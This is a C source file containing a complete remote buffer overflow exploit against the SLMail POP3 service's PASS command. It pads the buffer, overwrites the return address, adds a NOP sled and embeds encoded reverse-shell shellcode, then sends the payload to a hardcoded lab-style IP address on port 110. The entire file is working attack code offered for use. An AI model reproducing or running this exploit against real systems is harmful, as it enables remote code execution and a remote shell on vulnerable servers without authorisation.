#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define retadd "\x8f\x35\x4a\x5f"
#define port 110

/* revshell  */
char shellcode[] =
"\xb8\x39\x24\x28\x1d\xdd\xc2\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\x7e\x2a\xca\xe8\x7c\xda\x88"
"\x13\x7c\x1b\xed\x9a\x99\x2a\x2d\xf8\xea\x1d\x9d\x8a\xbe\x91"
"\x56\xde\x2a\x21\x1a\xf7\x5d\x82\x91\x21\x50\x13\x89\x12\xf3"
"\x97\xd0\x46\xd3\xa6\x1a\x9b\x12\xee\x47\x56\x46\xa7\x0c\xc5"
"\x76\xcc\x59\xd6\xfd\x9e\x4c\x5e\xe2\x57\x6e\x4f\xb5\xec\x29"
"\x4f\x34\x20\x42\xc6\x2e\x25\x6f\x90\xc5\x9d\x1b\x23\x0f\xec"
"\xe4\x88\x6e\xc0\x16\xd0\xb7\xe7\xc8\xa7\xc1\x1b\x74\xb0\x16"
"\x61\xa2\x35\x8c\xc1\x21\xed\x68\xf3\xe6\x68\xfb\xff\x43\xfe"
"\xa3\xe3\x52\xd3\xd8\x18\xde\xd2\x0e\xa9\xa4\xf0\x8a\xf1\x7f"
"\x98\x8b\x5f\xd1\xa5\xcb\x3f\x8e\x03\x80\xd2\xdb\x39\xcb\xba"
"\x28\x70\xf3\x3a\x27\x03\x80\x08\xe8\xbf\x0e\x21\x61\x66\xc9"
"\x46\x58\xde\x45\xb9\x63\x1f\x4c\x7e\x37\x4f\xe6\x57\x38\x04"
"\xf6\x58\xed\x8b\xa6\xf6\x5e\x6c\x16\xb7\x0e\x04\x7c\x38\x70"
"\x34\x7f\x92\x19\xdf\x7a\x75\x2c\x2b\x84\x0f\x58\x29\x84\x0e"
"\x22\xa4\x62\x7a\x44\xe1\x3d\x13\xfd\xa8\xb5\x82\x02\x67\xb0"
"\x85\x89\x84\x45\x4b\x7a\xe0\x55\x3c\x8a\xbf\x07\xeb\x95\x15"
"\x2f\x77\x07\xf2\xaf\xfe\x34\xad\xf8\x57\x8a\xa4\x6c\x4a\xb5"
"\x1e\x92\x97\x23\x58\x16\x4c\x90\x67\x97\x01\xac\x43\x87\xdf"
"\x2d\xc8\xf3\x8f\x7b\x86\xad\x69\xd2\x68\x07\x20\x89\x22\xcf"
"\xb5\xe1\xf4\x89\xb9\x2f\x83\x75\x0b\x86\xd2\x8a\xa4\x4e\xd3"
"\xf3\xd8\xee\x1c\x2e\x59\x1e\x57\x72\xc8\xb7\x3e\xe7\x48\xda"
"\xc0\xd2\x8f\xe3\x42\xd6\x6f\x10\x5a\x93\x6a\x5c\xdc\x48\x07"
"\xcd\x89\x6e\xb4\xee\x9b";

struct sockaddr_in plm,lar,target;

int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}

int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.11.83");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}